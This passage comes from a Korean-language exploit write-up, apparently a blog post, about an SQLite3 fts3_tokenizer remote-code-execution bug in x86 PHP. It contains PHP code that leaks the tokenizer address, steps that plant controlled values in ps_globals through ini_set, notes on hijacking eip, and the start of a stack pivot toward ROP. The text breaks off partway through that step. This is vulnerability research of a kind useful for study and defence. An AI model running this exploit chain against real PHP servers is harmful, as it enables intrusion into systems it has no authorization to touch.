punctuation\">;</span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"create table a using fts3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// crash</span></code></pre></div>\n<ul>\n<li>다음과 같은 형태로 취약점 Exploit 흐름이 진행되어 집니다.</li>\n<li>x86 환경에서의 취약점은 <code class=\"language-text\">xCreate</code> 의 Callback 트리거 만으로 Exploit 진행이 어렵다고 판단하여 <code class=\"language-text\">xOpen</code> 의 인자 트리거를 통해 진행하였습니다.</li>\n</ul>\n<h2 id=\"x86bit-환경-php-with-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86bit 환경 php with sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</h2>\n<h3 id=\"fts3_tokenizer-info-leak\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-info-leak\" aria-label=\"fts3_tokenizer info leak permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer info leak</h3>\n<ul>\n<li>leak 된 simple tokenizer의 주소 값을 리틀 엔디안으로 변경 작업을 진행시 4바이트 기준으로 fllip을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$val</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3 id=\"fts3-tokenizer-callback\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-callback\" aria-label=\"fts3 tokenizer callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer callback</h3>\n<ul>\n<li>2번째 인자인 callback 주소를 컨트롤 하여 임의의 값으로 덮여 씌어진 것을 확인 할 수 있습니다.</li>\n<li><code class=\"language-text\">edi</code> 레지스터를 조작해 원하는 방향을 이동이 가능한 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4y32U6XKiUBSEMTHqGBVXXOOuiGzigrtGy8oyM+//Oj112sEKcWp+UBQXbt/vnO6D0u1PMBr7aHVs9AYe5FkfLzAczWE5Gwz02W29Wteh5prIFVoolLrI5pt4iOYQeczyLpdSqenQjQUMcwlvdqS4CBimD9Ne8V2jOUalNuShuUIb8R8akqkqEsnyveBLy0Sn52IyPZCqVO4hGivg8SnPD2KJIjcokcz1elBDVyAW3JWi1oM3O5Ck1bXRH05JKeUpShqFUgf5YpuH1ZtjKEqKm79ShQif0zVsdu8wnTWcyRazxSt2h08MjTkFaw0DWqWP5foC292i/mKw7GvpJSgRNUyYytSwWJ5JJX0TI2b+iW0QQSEtal1MpnvM/RMPLFcHbI2sxxKle8LV5g2Ot6Oo6+3gry909Uo4oqMiZLkbGiNmPMWLJJRehwSFcLv/oCmWsybJavt2E2y2LTosPRRno7H8/015TldZythaMXOmveazkIig9EyMu5qUokiQgH+aklLrOLz+IpmUG5giWRRBiZUEWXIqSRDyfLHDaH0VuglKGdP5kdPRG3rc6E73FJLcaZUBY2P9TYGU/50qJJhW6ziefnNKXG+P+fKMzf6DeSRh26KrfOefMbZXIbrvwiQUscFohr4+vY1gQChiQjgyfSZBSKWHwdQEojdT0moD++NP9tB2Nyx/e/ikQUEPJdjSBgm3ZFXyl0hqnOk7QsmU5E5ONqwlnMkO/uqCdtehq9ccdniQTIq4Xyr3SS1/njtBmQj5UEat0TTZ9GtUuognNTqayb5wTUi5KfhRRDJ3Jf8BBjCmWCl/LGYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/21ee7ce62817f36943371acf662f8f00/37523/7.png\"\n        srcset=\"/static/21ee7ce62817f36943371acf662f8f00/e9ff0/7.png 180w,\n/static/21ee7ce62817f36943371acf662f8f00/f21e7/7.png 360w,\n/static/21ee7ce62817f36943371acf662f8f00/37523/7.png 720w,\n/static/21ee7ce62817f36943371acf662f8f00/83e77/7.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>하지만 해당 레지스터를 활용해서 Stack Pivot를 하기에는 어려움이 있기 때문에 <code class=\"language-text\">xOpen</code> 의 pInput을 트리거하는 방식으로 조작해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">int</span> nBytes<span class=\"token punctuation\">,</span>\n\tsqlite3_tokenizer_cursor <span class=\"token operator\">*</span><span class=\"token operator\">*</span>ppCursor\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>만약 xCreate 를 모두 제어하기 위해서는 xOpen을 제어할 수 있는 연속적인 메모리 데이터 3개 이상이 필요합니다.</li>\n<li>이를 위해서 <code class=\"language-text\">PHP.ini</code> list의 값을 설정합니다.</li>\n</ul>\n<p><strong>PHP.ini (Structure _php_ps_globals)</strong></p>\n<ul>\n<li>Expand PHP Module의 코드를 보면 해당 ini 구조체가 정의되어 있으며 이러한 자료구조는 프로세스 상에서 전역적으로 존재하고 <code class=\"language-text\">.bss</code> 섹션에 포함되어 있기 때문에 위치를 알 수 있으며 공격하는데 있어서 좋은 벡터입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://www.php.net/manual/en/ini.list.php</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_php_ps_globals</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>save_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>session_name<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>id<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>extern_referer_chk<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>entropy_file<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cache_limiter<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> entropy_length<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cookie_lifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_domain<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_secure<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_httponly<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>mod<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>default_mod<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mod_data<span class=\"token punctuation\">;</span>\n\tphp_session_status session_status<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_probability<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_divisor<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_maxlifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> module_number<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cache_expire<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>앞서 구조체에서 활용하는 필드는 빨간색으로 주석 처리한 부분을 사용할 예정이며, 포인터 구조와 정수 형태를 트리거할 수 있는 필드를 선정하여 가젯들이 적용할 수 있는 범위를 늘렸습니다.</li>\n<li>php.ini 항목을 조작하여 fts3 tokenizer 모듈 구조체를 조작할 수 있습니다.</li>\n</ul>\n<h3 id=\"fts3-tokenizer-두-번째-인자-ebp-레지스터-조작\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\" aria-label=\"fts3 tokenizer 두 번째 인자 ebp 레지스터 조작 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</h3>\n<ul>\n<li>두 번쨰 인자 ebp 레지스터를 다양한 메모리 범위로 조작이 가능하기 때문에 php.ini 의 <code class=\"language-text\">ps_globals</code> 의 구조체를 사용하기 위해 <code class=\"language-text\">gc_probability</code> 필드의 주소를 지정하였고 해당 위치로 이동하기 에 있어 <code class=\"language-text\">-0x4</code> 바이트 연산을 해서 호출원에서 계산 된 오프셋을 조작하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQY0z2Q2U7CYBCFf3YoLRQQWkpFUBarhbYsDdZSliIERaIhJt75/k9xzEyMVzOZzJz5zhGT+RreNILtBFwdbwm1eoNavYt2x0b3zkGl1oHZfoBuDCDJTeQlDbc9F4ZpIZmuoKH3eVeSdYgwOmLmb+F4IRbBC/ynHR/K5RbW23ds4jNEsoyR+4z98QKt2Udd6+Hy9YPl6hXpbA3+Ika8/2AIQUT2OMDAmsGdLFm4dW2hqBhYbU6I1m9IZap4HC1wOF74iIh3+0+MvZAJyRk9J2ciCA9wpxGG1pzFqCd85Y+QREmQIjmdv2GY92ybHlAcJNgfTjHzN1BUE4KGhaKOXKHxn082X2crlEmhqPERzeVSC5ncFUcghAKRKCGRUrkKIXP/CxNqjhNe+sh1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/baacb06fc343009d4872d0068294f270/37523/8.png\"\n        srcset=\"/static/baacb06fc343009d4872d0068294f270/e9ff0/8.png 180w,\n/static/baacb06fc343009d4872d0068294f270/f21e7/8.png 360w,\n/static/baacb06fc343009d4872d0068294f270/37523/8.png 720w,\n/static/baacb06fc343009d4872d0068294f270/1e088/8.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ps_globals의 <code class=\"language-text\">gc_probability</code>, <code class=\"language-text\">gc_divisor</code>, <code class=\"language-text\">gc_maxlifetime</code> 해당 필드는 셋 전부 long 타입을 갖는 필드 입니다.</li>\n<li><code class=\"language-text\">xOpen</code> 을 트리거하기 위해서는 정상적으로 <code class=\"language-text\">xCreate</code> 가 동작한 후에 <code class=\"language-text\">insert query</code> 가 실행되어야 합니다. 그렇기 때문에 fts3 table <code class=\"language-text\">simple</code> 의 <code class=\"language-text\">simple_create</code> 해시 테이블 주소를 콜백으로 변경하여 <code class=\"language-text\">xOepn</code> 함수로 갈 경로를 만들어 봅시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNklEQVQY02WRaU/CQBiEUa5KEGmB2tRCaWnlElpALqEC4RQbjSVoICpfTPT//4Ex+yYYDB8mu9njmdlZn1Xro1huQ9UqSKtlGPk6hGQWwXASslKErBTgDwrgE1mac5FLUkoyEBcyOA3wOPHHaWTytbsTNJojRGMylEwJb9svMuAiIqYLD9O5h0AogZtqF956R6Z8QoX7tEHPWRDsH9AZLtHtzSAkNWg5C++fP6hYPUoxW6zw4L5SWrvuYPvxDVWvUNrVeofByD0G1m4HqNp9RGNXkOQ8OefMGkJcCs5gSWIJC6UW3OcN1RCLp8ms1RkfA5udMay6A1EyYeYbmMxekNWrCJ+JYHt3/TkB2Rp7oigZOL9QKDE7f9Th/fARumFDN23qiXXkD/KUUJKv/z5lf2Gvw7VD4C+nJqeQLk/kqAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png\"\n        srcset=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/e9ff0/9.png 180w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/f21e7/9.png 360w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png 720w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/5b481/9.png 846w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>현재 환경에서 <code class=\"language-text\">0xe3bbc0</code> 의 주소는 <code class=\"language-text\">simpleCreate</code> 객체를 가리키고 다음 <code class=\"language-text\">0x7fffffff</code> 두 값들은 임의로 집어넣은 값입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQI1x3MYQqCMACAUVPLFJVp22w6QZMpaCEhmD+6/7W+oHeA58WyI1UDWrSYvEGmBissVrSUeU1W1KTGEcuerHLEicG/SMKrJogU/vmG5+ecAoEfFnhiWNHTh6ed2eqRpRrYmonVjDgzcO8m1LwjlwO1HOj+TWFelI+Dst+R7ksiR4JI/tMfs4EzcOgpS4wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png\"\n        srcset=\"/static/f4ca616e40d5344f5d77255f3092c4c6/e9ff0/10.png 180w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/f21e7/10.png 360w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png 720w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/cecac/10.png 728w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>php의 <code class=\"language-text\">ini_set</code> 메서드를 이용해서 각 전역 필드에 값을 넣어 줍니다.</li>\n<li>앞서 xOpen 을 활용하기 위해 세 개의 메모리 대역이 필요하다고 했는데 이를 <code class=\"language-text\">ps_globals</code> 필드를 활용하였습니다.</li>\n<li>필드의 값이 어디 부분에서 터지는지를 확인하기 위해 임의의 데이터를 넣은 결과 <code class=\"language-text\">eip</code> 레지스터를 조작할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQoz5XSTXOCMBAG4BWtVgVSEFJUEAREHT9bqtVeOszYW///33mdrKPVg1M5bJI95MlmExomK7ivKYQVoG10Uam+oPpkX0LlWs3iuF7fC1KbiNroB1N87g8IhwvO1bzdHxBEc1DFfBglHkjHaPyO7+IX4+kG0hshTteYLXaQXnoD/lvhH5gj3xSI4iUaTReDaM647UTlwPqzy6Dq5e7rB344Q61uc55vC3i9rBzY0rvcM1WZCkcmjAhrAEP4IE2UexQiE0QGkuwNVidEz59AN/t8yBlT0CPYCdQEXzmbfHB1jozRaMrS3+UMHgF3Wbt/cgVUNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png\"\n        srcset=\"/static/6227d5a0df36cef3a1d595e8b3994e79/e9ff0/11.png 180w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/f21e7/11.png 360w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png 720w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/c1328/11.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 함수가 호출하는 호출 구간은 <code class=\"language-text\">call [edx+0xc]</code> 형태로 <code class=\"language-text\">edx</code> 레지스터를 기준으로 call이 되어지고 <code class=\"language-text\">eax</code> 레지스터에는 xOpen의 <code class=\"language-text\">insert in to query</code>의 value 값이 포함된 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"stack-pivot를-이용한-payload-data-메모리-위치-변경-작업\" style=\"position:relative;\"><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\" aria-label=\"stack pivot를 이용한 payload data 메모리 위치 변경 작업 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</h3>\n<ul>\n<li>앞서 취약점을 활용하여 프로그램 카운터를 조작이 가능한 상태입니다.</li>\n<li>원하는 메모리 번지의 대역을 eax 레지스터가 참조하고 있는 구조</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI133OvQ6CMABFYbQtYpGflhRaDJEEq6iLvv/DHQODg4kON2f7cpO88hg3Ys0JJS1KWcRSaZGiRiiDyBwbUZNsq7VbaT79XmKLwGuYufvIo5t4hgtXNzL3kXOIxDAxDjd80dOVPXnmSH5gK3jQHqM7yr2j0i0291jdousjuhlXQImaNG3YpQ3iz7sFfAMSPEXyTROC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png\"\n        srcset=\"/static/3ac23bc623be2a035e32088d57b9fee9/e9ff0/12.png 180w,\n/static/3ac23bc623be2a035e32088d57b9fee9/f21e7/12.png 360w,\n/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png 720w,\n/static/3ac23bc623be2a035e32088d57b9fee9/20982/12.png 778w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">insert into a value</code> 값으로 ROP를 수행할 수 있는 영역으로 만들기 위해 <code class=\"language-text\">XCHG</code> 가젯을 이용하여 eax 